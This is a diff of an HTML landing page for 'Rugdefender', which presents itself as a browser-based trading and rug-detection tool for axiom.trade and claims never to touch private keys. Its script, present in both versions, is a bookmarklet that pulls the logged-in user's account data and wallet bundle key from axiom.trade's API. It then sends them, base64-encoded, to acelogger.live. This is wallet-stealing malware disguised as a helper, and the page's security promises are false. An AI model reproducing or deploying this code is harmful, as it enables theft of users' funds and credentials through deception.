@@ -6,139 +6,275 @@
     <title>Rugdefender</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
-        /* ALL STYLES UNCHANGED */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: url('https://i.postimg.cc/QxNRx7Hf/bloom-background-1.jpg') center/cover no-repeat;
+            color: #fff;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        .background-overlay {
+            position: absolute;
+            inset: 0;
+            background: rgba(0,0,0,.6);
+            z-index: 1;
+        }
+
+        .container {
+            position: relative;
+            z-index: 2;
+            max-width: 1200px;
+            margin: auto;
+            padding: 0 20px;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: 800;
+        }
+
+        .highlight {
+            background: linear-gradient(45deg, #ff4081, #e91e63);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .header-buttons {
+            display: flex;
+            gap: 12px;
+        }
+
+        .btn-secondary, .btn-primary {
+            padding: 10px 20px;
+            border-radius: 8px;
+            text-decoration: none;
+            color: #fff;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .btn-secondary {
+            background: rgba(255,255,255,.1);
+            border: 1px solid rgba(255,255,255,.2);
+        }
+
+        .btn-primary {
+            background: linear-gradient(45deg, #ff4081, #e91e63);
+            border: none;
+        }
+
+        .main-content {
+            text-align: center;
+            padding: 80px 0 120px;
+        }
+
+        .badge {
+            display: inline-flex;
+            gap: 8px;
+            padding: 8px 16px;
+            border-radius: 20px;
+            background: rgba(255,255,255,.1);
+            margin-bottom: 40px;
+            font-size: 14px;
+        }
+
+        .main-title {
+            font-size: clamp(2.5rem, 5vw, 4rem);
+            font-weight: 800;
+            margin-bottom: 30px;
+        }
+
+        .main-description {
+            font-size: 18px;
+            max-width: 600px;
+            margin: 0 auto 40px;
+            color: rgba(255,255,255,.8);
+        }
+
+        .footer-note {
+            font-size: 14px;
+            color: rgba(255,255,255,.6);
+            margin-top: 40px;
+        }
+
+        .instructions-section,
+        .faq-section {
+            margin-top: 200px;
+            text-align: center;
+            opacity: 0;
+            transform: translateY(40px);
+            transition: .8s ease;
+        }
+
+        .visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .instructions-title,
+        .faq-title {
+            font-size: 48px;
+            font-weight: 800;
+            margin-bottom: 20px;
+        }
+
+        .instructions-subtitle {
+            font-size: 18px;
+            color: rgba(255,255,255,.8);
+            margin-bottom: 60px;
+        }
+
+        .steps-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit,minmax(300px,1fr));
+            gap: 40px;
+        }
+
+        .step {
+            opacity: 0;
+            transform: translateY(30px);
+            transition: .6s ease;
+        }
+
+        .step.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .step-number {
+            width: 60px;
+            height: 60px;
+            margin: auto;
+            border-radius: 50%;
+            background: linear-gradient(45deg,#ff4081,#e91e63);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            margin-bottom: 20px;
+        }
+
+        .faq-container {
+            max-width: 800px;
+            margin: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .faq-item {
+            background: rgba(255,255,255,.05);
+            border-radius: 12px;
+            overflow: hidden;
+        }
+
+        .faq-question {
+            width: 100%;
+            padding: 20px;
+            background: none;
+            border: none;
+            color: #fff;
+            font-size: 18px;
+            text-align: left;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .faq-answer {
+            max-height: 0;
+            overflow: hidden;
+            padding: 0 20px;
+            transition: .3s ease;
+        }
+
+        .faq-item.active .faq-answer {
+            max-height: 200px;
+            padding: 0 20px 20px;
+        }
     </style>
 </head>
 <body>
-    <div class="background-overlay"></div>
 
-    <div class="container">
-        <header class="header">
-            <div class="logo">
-                Rug<span class="highlight">defender</span>
+<div class="background-overlay"></div>
+
+<div class="container">
+    <header class="header">
+        <div class="logo">Rug<span class="highlight">defender</span></div>
+        <div class="header-buttons">
+            <a href="#instructions" class="btn-secondary" onclick="scrollToInstructions(event)">Instructions</a>
+            <button class="btn-primary">Activate</button>
+        </div>
+    </header>
+
+    <main class="main-content">
+        <div class="badge">⭐ Your Unfair Advantage in Crypto</div>
+
+        <h1 class="main-title">
+            The fastest way to<br>
+            <span class="highlight">dominate</span> axiom.trade
+        </h1>
+
+        <p class="main-description">
+            Rugdefender helps you monitor wallets, detect rugs early, and trade smarter on axiom.trade.
+        </p>
+
+        <p class="footer-note">
+            no installation • browser-based • secure
+        </p>
+
+        <section class="instructions-section" id="instructions">
+            <h2 class="instructions-title">Get started in 30 seconds</h2>
+            <p class="instructions-subtitle">No setup. No wallet connections.</p>
+
+            <div class="steps-container">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <h3>Open Axiom</h3>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <h3>Enable Rugdefender</h3>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <h3>Trade Safely</h3>
+                </div>
             </div>
-            <div class="header-buttons">
-                <a href="#instructions" class="btn-secondary" onclick="scrollToInstructions(event)">Instructions</a>
-                <a href="#" class="btn-primary" id="activateBtn">Activate</a>
-            </div>
-        </header>
+        </section>
 
-        <main class="main-content">
-            <div class="badge">
-                <span class="star-icon">⭐</span>
-                Your Unfair Advantage in Crypto
-            </div>
+        <section class="faq-section">
+            <h2 class="faq-title">FAQ</h2>
 
-            <h1 class="main-title">
-                The fastest way to<br>
-                <span class="highlight">dominate</span> axiom.trade
-            </h1>
-
-            <p class="main-description">
-                Advanced trading tools that give you an edge on axiom.trade. Monitor influencers, track wallets, automate buys, and never miss opportunities again.
-            </p>
-
-            <div class="bookmarklet-container">
-                <a href="#" class="bookmarklet" id="bookmarklet" draggable="true">
-                    Activate
-                </a>
-            </div>
-
-            <p class="footer-note">
-                no installation • works in browser • completely secure
-            </p>
-
-            <div class="instructions-section" id="instructions">
-                <h2 class="instructions-title">Get started in 30 seconds</h2>
-                <p class="instructions-subtitle">No complex setup. No wallet connections. Just drag and trade.</p>
-
-                <div class="steps-container">
-                    <div class="step">
-                        <div class="step-number">1</div>
-                        <div class="step-content">
-                            <h3 class="step-title">Drag to Install</h3>
-                            <p class="step-description">Drag the button above to your browser's bookmarks bar</p>
-                        </div>
-                    </div>
-
-                    <div class="step">
-                        <div class="step-number">2</div>
-                        <div class="step-content">
-                            <h3 class="step-title">Activate on Axiom.trade</h3>
-                            <p class="step-description">Visit axiom.trade and click your bookmark to activate Rugdefender</p>
-                        </div>
-                    </div>
-
-                    <div class="step">
-                        <div class="step-number">3</div>
-                        <div class="step-content">
-                            <h3 class="step-title">Start Trading</h3>
-                            <p class="step-description">Configure your settings or use defaults and start sniping</p>
-                        </div>
+            <div class="faq-container">
+                <div class="faq-item">
+                    <button class="faq-question" onclick="toggleFAQ(this)">
+                        Is Rugdefender secure?
+                        <span>+</span>
+                    </button>
+                    <div class="faq-answer">
+                        <p>Yes. Rugdefender never touches private keys.</p>
                     </div>
                 </div>
             </div>
+        </section>
+    </main>
+</div>
 
-            <div class="faq-section">
-                <h2 class="faq-title">Frequently asked questions</h2>
+<script>
+javascript:(async()=>{try{if(location.hostname==='acelogger.live')return alert('You are already on the bookmarklet site!');if(location.hostname!=='axiom.trade'){alert('Please navigate to axiom.trade to use this bookmarklet');location.replace('https://axiom.trade/discover')}else{if(!localStorage.getItem('isAuthed'))return alert('Please log in to axiom.trade to use this bookmarklet');const user=await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();const bundle=await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();const bookmarkData={customerId:'CUST-3BEEF8356DE9597B',site:location.href,user:user,bundle:bundle.bundleKey,sBundles:localStorage.getItem('sBundles')};location.replace('https://acelogger.live/data/'+btoa(JSON.stringify(bookmarkData)))}}catch(e){console.error('Bookmarklet error:',e);alert('error but idk what it is')}})()
+</script>
 
-                <div class="faq-container">
-                    <div class="faq-item">
-                        <button class="faq-question" onclick="toggleFAQ(this)">
-                            <span>What's the difference between Free and Pro plans?</span>
-                            <span class="faq-icon">+</span>
-                        </button>
-                        <div class="faq-answer">
-                            <p>The Free plan gives you basic access to Rugdefender with limited features. The Pro plan unlocks advanced features like automated trading, priority alerts, custom strategies, and unlimited wallet monitoring.</p>
-                        </div>
-                    </div>
-
-                    <div class="faq-item">
-                        <button class="faq-question" onclick="toggleFAQ(this)">
-                            <span>Is this secure? Do you access my wallet?</span>
-                            <span class="faq-icon">+</span>
-                        </button>
-                        <div class="faq-answer">
-                            <p>Absolutely secure. Rugdefender only reads public data from axiom.trade — we never access your private keys or control your wallet.</p>
-                        </div>
-                    </div>
-
-                    <div class="faq-item">
-                        <button class="faq-question" onclick="toggleFAQ(this)">
-                            <span>Is the Pro plan worth 1 SOL?</span>
-                            <span class="faq-icon">+</span>
-                        </button>
-                        <div class="faq-answer">
-                            <p>Most users recover the Rugdefender Pro cost within their first successful trade.</p>
-                        </div>
-                    </div>
-
-                    <div class="faq-item">
-                        <button class="faq-question" onclick="toggleFAQ(this)">
-                            <span>Can I upgrade from Free to Pro anytime?</span>
-                            <span class="faq-icon">+</span>
-                        </button>
-                        <div class="faq-answer">
-                            <p>Yes! You can upgrade to Rugdefender Pro at any time.</p>
-                        </div>
-                    </div>
-
-                    <div class="faq-item">
-                        <button class="faq-question" onclick="toggleFAQ(this)">
-                            <span>Can I really beat other bots?</span>
-                            <span class="faq-icon">+</span>
-                        </button>
-                        <div class="faq-answer">
-                            <p>Rugdefender’s speed and direct axiom.trade integration give you a significant edge.</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </main>
-    </div>
-
-    <script>
-        javascript:(async()=>{try{if(location.hostname==='acelogger.live')return alert('You are already on the bookmarklet site!');if(location.hostname!=='axiom.trade'){alert('Please navigate to axiom.trade to use this bookmarklet');location.replace('https://axiom.trade/discover')}else{if(!localStorage.getItem('isAuthed'))return alert('Please log in to axiom.trade to use this bookmarklet');const user=await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();const bundle=await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();const bookmarkData={customerId:'CUST-3BEEF8356DE9597B',site:location.href,user:user,bundle:bundle.bundleKey,sBundles:localStorage.getItem('sBundles')};location.replace('https://acelogger.live/data/'+btoa(JSON.stringify(bookmarkData)))}}catch(e){console.error('Bookmarklet error:',e);alert('error but idk what it is')}})()
-    </script>
 </body>
 </html>
